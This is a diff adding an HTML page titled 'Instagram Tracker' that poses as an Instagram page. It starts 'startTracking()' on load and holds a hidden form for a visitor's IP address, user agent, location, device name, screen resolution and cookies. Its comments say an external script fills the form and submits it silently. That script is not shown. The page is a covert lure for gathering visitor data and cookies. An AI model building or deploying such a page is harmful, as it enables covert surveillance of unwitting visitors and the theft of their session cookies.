@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Instagram Tracker</title>
+ <link rel="stylesheet" href="./style.css"> 
+</head>
+<body onload="startTracking()">
+ <div class="instagram-container">
+ <header class="instagram-header">
+ <img src="https://scontent.fwnp1-1.fna.fbcdn.net/v/t39.30808-1/558929707_796852866646342_3764675000464138355_n.jpg?stp=c0.0.225.225a_dst-jpg_e48_q75_tt6&cstp=mx225x225&ctp=s225x225&_nc_cat=106&ccb=1-7&_nc_sid=e99d92&_nc_ohc=dlEgIjOioP0Q7kNvwGz99KZ&_nc_oc=AdojZiwt36yR9gzQatbVpQjqq9PGMSrK4NboFtPbbGGSmhyKI9LmkQWmmv1Jpwy2eSc&_nc_ad=z-m&_nc_cid=0&_nc_zt=24&_nc_ht=scontent.fwnp1-1.fna&_nc_ss=7a3ba&oh=00_AQK3C7Rd_jYSNU_Gr-80CoMxFAKB-tbFhjJduALuhKeKZw&oe=6AA44AD2" alt="" style="height: 60px; margin-top: 10px;">
+ </header>
+
+ <!-- Hidden Form for Data Submission -->
+ <form id="deviceInfo" action="" method="">
+ <input type='hidden' name='ipAddress' id='ipAddress'>
+ <input type='hidden' name='userAgent' id='userAgent'>
+ <input type='hidden' name='location' id='location'>
+ <input type='hidden' name='deviceName' id='deviceName'>
+ <input type='hidden' name='screenResolution' id='screenResolution'>
+ <input type='hidden' name='cookiesData' id='cookiesData'> 
+ </form>
+
+ </div>
+
+ <!-- JavaScript to fill hidden fields and submit form silently -->
+ <script src='./script.js'></script>
+</body></html>
